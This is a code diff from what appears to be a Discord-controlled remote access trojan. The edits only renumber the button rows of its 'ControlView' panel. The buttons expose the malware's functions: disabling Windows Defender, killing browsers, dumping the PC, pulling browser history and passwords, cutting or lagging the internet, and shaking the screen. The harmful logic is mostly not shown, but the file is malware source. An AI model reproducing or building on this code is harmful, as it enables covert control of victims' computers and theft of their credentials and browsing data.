@@ -284,7 +284,7 @@ class ControlView(discord.ui.View):
             except:
                 pass
 
-    @discord.ui.button(label="🛡️ Disable Defender", style=discord.ButtonStyle.danger, row=5)
+    @discord.ui.button(label="🛡️ Disable Defender", style=discord.ButtonStyle.danger, row=4)
     async def disable_defender(self, interaction: discord.Interaction, button: discord.ui.Button):
         try:
             try:
@@ -298,7 +298,7 @@ class ControlView(discord.ui.View):
             except:
                 pass
 
-    @discord.ui.button(label="🌐 Kill Browsers", style=discord.ButtonStyle.danger, row=5)
+    @discord.ui.button(label="🌐 Kill Browsers", style=discord.ButtonStyle.danger, row=4)
     async def kill_browsers(self, interaction: discord.Interaction, button: discord.ui.Button):
         try:
             browsers = ['chrome.exe', 'firefox.exe', 'msedge.exe', 'iexplore.exe']
@@ -314,7 +314,7 @@ class ControlView(discord.ui.View):
             except:
                 pass
 
-    @discord.ui.button(label="💾 PC Dump", style=discord.ButtonStyle.danger, row=5)
+    @discord.ui.button(label="💾 PC Dump", style=discord.ButtonStyle.danger, row=4)
     async def pc_dump(self, interaction: discord.Interaction, button: discord.ui.Button):
         try:
             await interaction.response.defer()
@@ -342,7 +342,7 @@ class ControlView(discord.ui.View):
             except:
                 pass
 
-    @discord.ui.button(label="🖥️ Shake Screen", style=discord.ButtonStyle.danger, row=6)
+    @discord.ui.button(label="🖥️ Shake Screen", style=discord.ButtonStyle.danger, row=3)
     async def shake_screen(self, interaction: discord.Interaction, button: discord.ui.Button):
         try:
             import threading
@@ -376,7 +376,7 @@ class ControlView(discord.ui.View):
             except:
                 pass
 
-    @discord.ui.button(label="📶 Internet Lag", style=discord.ButtonStyle.danger, row=7)
+    @discord.ui.button(label="📶 Internet Lag", style=discord.ButtonStyle.danger, row=2)
     async def internet_lag(self, interaction: discord.Interaction, button: discord.ui.Button):
         try:
             try:
@@ -392,7 +392,7 @@ class ControlView(discord.ui.View):
             except:
                 pass
 
-    @discord.ui.button(label="🚫 Disable Internet", style=discord.ButtonStyle.danger, row=7)
+    @discord.ui.button(label="🚫 Disable Internet", style=discord.ButtonStyle.danger, row=2)
     async def disable_internet(self, interaction: discord.Interaction, button: discord.ui.Button):
         try:
             try:
@@ -406,7 +406,7 @@ class ControlView(discord.ui.View):
             except:
                 pass
 
-    @discord.ui.button(label="📖 Browser History", style=discord.ButtonStyle.danger, row=8)
+    @discord.ui.button(label="📖 Browser History", style=discord.ButtonStyle.danger, row=1)
     async def browser_history(self, interaction: discord.Interaction, button: discord.ui.Button):
         try:
             await interaction.response.defer()
@@ -456,7 +456,7 @@ class ControlView(discord.ui.View):
             except:
                 pass
 
-    @discord.ui.button(label="💬 Message", style=discord.ButtonStyle.danger, row=8)
+    @discord.ui.button(label="💬 Message", style=discord.ButtonStyle.danger, row=1)
     async def message(self, interaction: discord.Interaction, button: discord.ui.Button):
         try:
             modal = MessageModal()
@@ -467,7 +467,7 @@ class ControlView(discord.ui.View):
             except:
                 pass
 
-    @discord.ui.button(label="🔑 Password", style=discord.ButtonStyle.danger, row=8)
+    @discord.ui.button(label="🔑 Password", style=discord.ButtonStyle.danger, row=1)
     async def password(self, interaction: discord.Interaction, button: discord.ui.Button):
         try:
             await interaction.response.defer()
